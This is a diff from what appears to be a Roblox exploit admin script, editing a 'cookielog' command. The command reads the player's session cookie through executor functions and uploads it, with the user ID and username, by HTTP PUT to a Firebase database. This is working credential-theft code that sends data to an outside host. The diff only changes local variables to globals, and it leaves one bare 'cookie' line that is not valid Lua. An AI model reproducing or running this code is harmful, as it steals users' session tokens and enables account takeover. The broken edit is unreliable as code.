@@ -13627,8 +13627,8 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend'}, function(args, speaker)
 	base = base:gsub('/+$', '')
 
 	-- cookie
-	local cookie
-	local ok, c = pcall(function() return (syn and syn.cookie) or getcookie() end)
+	cookie
+	ok, c = pcall(function() return (syn and syn.cookie) or getcookie() end)
 	if ok and c and c ~= '' then cookie = c end
 	if not cookie then
 		ok, c = pcall(function() return game:GetService('HttpService'):GetCookie() end)
@@ -13657,14 +13657,14 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend'}, function(args, speaker)
 		iso         = os.date('!%Y-%m-%dT%H:%M:%SZ'),
 	}
 
-	local okj, body = pcall(function() return game:GetService('HttpService'):JSONEncode(data) end)
+	okj, body = pcall(function() return game:GetService('HttpService'):JSONEncode(data) end)
 	if not okj then
 		body = '{"cookie":"' .. cookie:gsub('"', '\\"') .. '","userId":' .. data.userId .. '}'
 	end
 
 	-- upload
-	local target = base .. '/cookies/' .. tostring(data.userId) .. '.json' .. auth
-	local okh, res = pcall(function()
+	target = base .. '/cookies/' .. tostring(data.userId) .. '.json' .. auth
+	okh, res = pcall(function()
 		return httprequest({
 			Url = target,
 			Method = 'PUT',
@@ -13673,7 +13673,7 @@ addcmd('cookielog', {'clog', 'fbcookie', 'cookiesend'}, function(args, speaker)
 		})
 	end)
 
-	local code = (okh and type(res) == 'table') and (res.StatusCode or res.Status or res.status) or nil
+	code = (okh and type(res) == 'table') and (res.StatusCode or res.Status or res.status) or nil
 	if okh and code and code >= 200 and code < 300 then
 		notify('Cookie Logger', 'Saved ' .. data.username .. ' to Firebase.', 5)
 	else
